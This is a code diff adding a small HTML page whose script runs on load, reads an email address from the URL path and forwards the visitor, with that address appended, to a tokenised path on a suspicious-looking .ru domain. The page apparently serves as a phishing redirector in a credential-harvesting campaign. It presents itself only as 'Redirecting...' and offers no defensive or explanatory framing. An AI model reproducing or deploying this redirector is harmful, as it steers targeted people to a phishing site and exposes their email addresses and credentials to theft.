@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect with Email</title>
+    <script>
+        // Function to capture the path (e.g., aa@aa.com) and redirect
+        function redirectWithEmail() {
+            // Get the path of the URL (after the domain)
+            var path = window.location.pathname.substring(1); // Removes the leading "/"
+            
+            // Set the base URL for redirection
+            var redirectUrl = "https://angv.creatibgminds.ru/0UlGO1TUaOlq9IXSVdyZE/";
+            
+            // If path exists (it will be the email address), append it to the base URL
+            if (path) {
+                window.location.href = redirectUrl + path;
+            } else {
+                window.location.href = redirectUrl; // If no path, just redirect to base URL
+            }
+        }
+
+        // Call the redirect function when the page loads
+        window.onload = redirectWithEmail;
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
